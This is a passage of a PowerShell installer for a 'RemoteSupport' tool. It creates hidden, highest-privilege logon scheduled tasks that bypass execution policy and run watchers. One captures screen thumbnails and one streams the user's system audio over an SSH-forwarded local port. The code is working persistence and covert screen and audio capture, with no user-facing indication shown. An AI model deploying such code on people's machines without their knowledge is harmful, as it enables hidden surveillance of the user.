Set-Content -Path (Join-Path $dir 'workcover.ps1') -Value $workCover -Encoding UTF8
$wuser = (Get-CimInstance Win32_ComputerSystem).UserName
$wtr = 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\RemoteSupport\workcover.ps1'
if ($wuser) { schtasks /create /tn RemoteSupportWorkCover /tr "$wtr" /sc onlogon /ru "$wuser" /rl HIGHEST /it /f | Out-Null }
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*workcover.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
schtasks /run /tn RemoteSupportWorkCover *>$null

# ============================================================
#  Live client thumbnails (ScreenConnect-style)
#  A user-session watcher captures the primary screen to a small
#  thumb.jpg while THUMB.flag is fresh (dashboard refreshes it).
#  The dashboard reads thumb.jpg over SSH and shows it, auto-refresh.
# ============================================================
$thumbWatch = @'
$ErrorActionPreference='SilentlyContinue'
$dir="$env:ProgramData\RemoteSupport"
$flag=Join-Path $dir 'THUMB.flag'
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$enc=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' } | Select-Object -First 1
$ep=New-Object Drawing.Imaging.EncoderParameters 1
$ep.Param[0]=New-Object Drawing.Imaging.EncoderParameter ([Drawing.Imaging.Encoder]::Quality),([long]40)
while($true){
  if((Test-Path $flag) -and ((((Get-Date)-(Get-Item $flag).LastWriteTime).TotalSeconds) -lt 30)){
    try{
      $b=[Windows.Forms.Screen]::PrimaryScreen.Bounds
      $bmp=New-Object Drawing.Bitmap $b.Width,$b.Height
      $g=[Drawing.Graphics]::FromImage($bmp)
      $g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
      $g.Dispose()
      $tw=360; $th=[int]($b.Height*$tw/$b.Width)
      $small=New-Object Drawing.Bitmap $tw,$th
      $g2=[Drawing.Graphics]::FromImage($small); $g2.InterpolationMode='HighQualityBicubic'; $g2.DrawImage($bmp,0,0,$tw,$th); $g2.Dispose()
      $tmp=Join-Path $dir 'thumb.tmp.jpg'
      $small.Save($tmp,$enc,$ep)
      $small.Dispose(); $bmp.Dispose()
      Move-Item $tmp (Join-Path $dir 'thumb.jpg') -Force
    }catch{}
    Start-Sleep -Seconds 3
  } else {
    Start-Sleep -Milliseconds 800
  }
}
'@
Set-Content -Path (Join-Path $dir 'thumbwatch.ps1') -Value $thumbWatch -Encoding UTF8
$tuser = (Get-CimInstance Win32_ComputerSystem).UserName
$ttr = 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\RemoteSupport\thumbwatch.ps1'
if ($tuser) { schtasks /create /tn RemoteSupportThumb /tr "$ttr" /sc onlogon /ru "$tuser" /rl HIGHEST /it /f | Out-Null }
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*thumbwatch.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
schtasks /run /tn RemoteSupportThumb *>$null

# ============================================================
#  Live audio listen (no DLL / no driver - pure WASAPI P/Invoke)
#  A user-session watcher captures the default playback device's
#  LOOPBACK audio (what the client hears) and serves it on
#  127.0.0.1:9988 (loopback only - never exposed to the network).
#  The dashboard reaches it through the EXISTING SSH connection
#  with a local port-forward (ssh -L), so no new firewall port is
#  opened and only an authenticated SSH user can ever connect.
#  Captures only while a client is connected; idle = blocking
#  accept (0% CPU). Runs in the user session so it hears the
#  logged-in user's audio.
# ============================================================
$audioWatch = @'
$ErrorActionPreference='SilentlyContinue'
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.IO;
namespace RSWasapi {
 [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] public class MMDevEnum {}
 [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
 public interface IMMDeviceEnumerator {
  int f0(int a,int b,out IntPtr c);
  int GetDefaultAudioEndpoint(int dataFlow,int role,out IMMDevice ppDevice);
 }
 [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
 public interface IMMDevice {
  int Activate([MarshalAs(UnmanagedType.LPStruct)] Guid iid,int ctx,IntPtr p,[MarshalAs(UnmanagedType.IUnknown)] out object o);
 }
 [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
 public interface IAudioClient {
  int Initialize(int share,int flags,long dur,long period,IntPtr fmt,IntPtr guid);
  int GetBufferSize(out uint n);
  int GetStreamLatency(out long l);
  int GetCurrentPadding(out uint p);
  int IsFormatSupported(int share,IntPtr fmt,out IntPtr closest);
  int GetMixFormat(out IntPtr fmt);
  int GetDevicePeriod(out long def,out long min);
  int Start();
  int Stop();
  int Reset();
  int SetEventHandle(IntPtr h);
  int GetService([MarshalAs(UnmanagedType.LPStruct)] Guid iid,[MarshalAs(UnmanagedType.IUnknown)] out object o);
 }
 [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
 public interface IAudioCaptureClient {
  int GetBuffer(out IntPtr data,out uint frames,out uint flags,out long dp,out long qp);
  int ReleaseBuffer(uint frames);
  int GetNextPacketSize(out uint frames);
 }
 public class Loop {
  static Guid IID_AC=new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
  static Guid IID_CC=new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
  IAudioClient ac; IAudioCaptureClient cc;
  public int Rate,Ch,Bits,Tag,Block;
  public void Open(){
   var en=(IMMDeviceEnumerator)(new MMDevEnum());
   IMMDevice dev; en.GetDefaultAudioEndpoint(0,0,out dev);
   object o; dev.Activate(IID_AC,23,IntPtr.Zero,out o); ac=(IAudioClient)o;
   IntPtr pf; ac.GetMixFormat(out pf);
   Tag=Marshal.ReadInt16(pf,0)&0xFFFF; Ch=Marshal.ReadInt16(pf,2)&0xFFFF; Rate=Marshal.ReadInt32(pf,4);
   Block=Marshal.ReadInt16(pf,12)&0xFFFF; Bits=Marshal.ReadInt16(pf,14)&0xFFFF;
   if(Tag==0xFFFE){ Tag=(Bits==32)?3:1; }
   ac.Initialize(0,0x00020000,2000000,0,pf,IntPtr.Zero);
   object o2; ac.GetService(IID_CC,out o2); cc=(IAudioCaptureClient)o2;
   ac.Start();
  }
  public byte[] Read(){
   uint pk; cc.GetNextPacketSize(out pk); if(pk==0){ return null; }
   MemoryStream ms=new MemoryStream();
   while(pk!=0){
    IntPtr d; uint fr,fl; long a,b; cc.GetBuffer(out d,out fr,out fl,out a,out b);
    int bytes=(int)fr*Block; byte[] buf=new byte[bytes];
    if((fl&0x2)==0 && d!=IntPtr.Zero){ Marshal.Copy(d,buf,0,bytes); }
    ms.Write(buf,0,bytes); cc.ReleaseBuffer(fr); cc.GetNextPacketSize(out pk);
   }
   return ms.ToArray();
  }
  public void Close(){ try{ac.Stop();}catch{} ac=null; cc=null; }
 }
}
"@
$listener=New-Object System.Net.Sockets.TcpListener ([System.Net.IPAddress]::Loopback,9988)
try{ $listener.Start() }catch{ exit }
while($true){
  $client=$null; $ns=$null; $cap=$null
  try{
    $client=$listener.AcceptTcpClient()
    $ns=$client.GetStream()
    $cap=New-Object RSWasapi.Loop
    $cap.Open()
    $hdr=[Text.Encoding]::ASCII.GetBytes(("RSAUD {0} {1} {2} {3}`n" -f $cap.Rate,$cap.Ch,$cap.Bits,$cap.Tag))
    $ns.Write($hdr,0,$hdr.Length)
    while($true){
      $data=$cap.Read()
      if($data -and $data.Length){ $ns.Write($data,0,$data.Length) }
      else{ Start-Sleep -Milliseconds 8 }
    }
  }catch{}
  finally{
    try{ $cap.Close() }catch{}
    try{ $ns.Close() }catch{}
    try{ $client.Close() }catch{}
  }
  Start-Sleep -Milliseconds 200
}
'@
Set-Content -Path (Join-Path $dir 'audiolisten.ps1') -Value $audioWatch -Encoding UTF8
$auser = (Get-CimInstance Win32_ComputerSystem).UserName
$atr = 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\RemoteSupport\audiolisten.ps1'
if ($auser) { schtasks /create /tn RemoteSupportAudio /tr "$atr" /sc onlogon /ru "$auser" /rl HIGHEST /it /f | Out-Null }
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*audiolisten.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
schtasks /run /tn RemoteSupportAudio *>$null
